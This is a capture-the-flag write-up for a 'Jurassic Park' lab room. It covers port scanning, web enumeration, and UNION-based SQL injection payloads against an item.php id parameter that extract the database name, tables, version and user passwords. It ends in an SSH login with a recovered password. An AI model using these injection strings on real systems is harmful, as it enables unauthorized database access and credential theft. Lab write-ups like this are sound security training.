# Jurassic Park

This medium-hard task will require you to enumerate the web application, get credentials to the server and find 5 flags hidden around the file system. Oh, Dennis Nedry has helped us to secure the app too...

You're also going to want to turn up your devices volume (firefox is recommended). So, deploy the VM and get hacking..

## Recon

Initial `nmap -p-` revealed:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-26 02:54 UTC
Nmap scan report for ip-10-10-23-246.eu-west-1.compute.internal (10.10.23.246)
Host is up (0.00065s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:C7:70:B4:4A:54 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.83 seconds
```

nikto and dirb against the website revealed a delete page, whose contents was the following:

```
New priv esc for Ubunut??

Change MySQL password on main system!
```

The assets dir was also listable. It contained images and a few audio files, none of which seemed to contain anything of note.

Clicking through the website to `shop.php` there were three packages you could buy. Clicking through on any of them took me to `item.php` with a query param `id` of 1, 2 or 3. The id seemed injectable; some entries, like `id=*` would return a mysql error. Others, like `id='`, would trigger a denied error page with a jurassic park themed error.

I tried incrementing id, and on id 5 I got a 'development product' with the description:

```
Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?
```

## SQLi

Trying the query `1 union select null, password, null, null, null from users` results in the password `ih8dinos` being printed on screen. I had confirmed the five column select and positioning already through trial and error.

Select into outfile didn't work (--secure-file-priv or whatever was not set). Select `user()` revealed mysql was running as root@localhost. Trying to ssh onto the box with root and `ih8dinos` did not get me access unfortunately.

I discovered the sql inject would only return the last row from its query as a result. Therefore, ih8dinos from above was the password of the final row in the users table. Appending `limit 2` got a second and as far as I could see, the only other password: `D0nt3ATM3`. This also didn't work with ssh.

However, focusing on the room questions:

1. To get the database name, I used: `1 union select distinct null, table_schema, null, null, null from information_schema.tables limit 4` and revealed `park`

2. I used `1 union select null, table_name, null, null, null from information_schema.tables where table_schema = "park" limit 2` to discover just two tables, `items` and `users`. I already know from my injection that `items` has `5` columns

3. `1 union select null, version(), null, null, null` reveals `5.7.25-0ubuntu0.16.04.2`. Going by the answer mask, the answer is `ubuntu 16.04`.

4. Dennis' password could be one of the two I have found so far. `ih8dinos` was the answer.

At this point I tried ssh'ing as `dennis` to the machine, and the password worked, getting me a shell as dennis.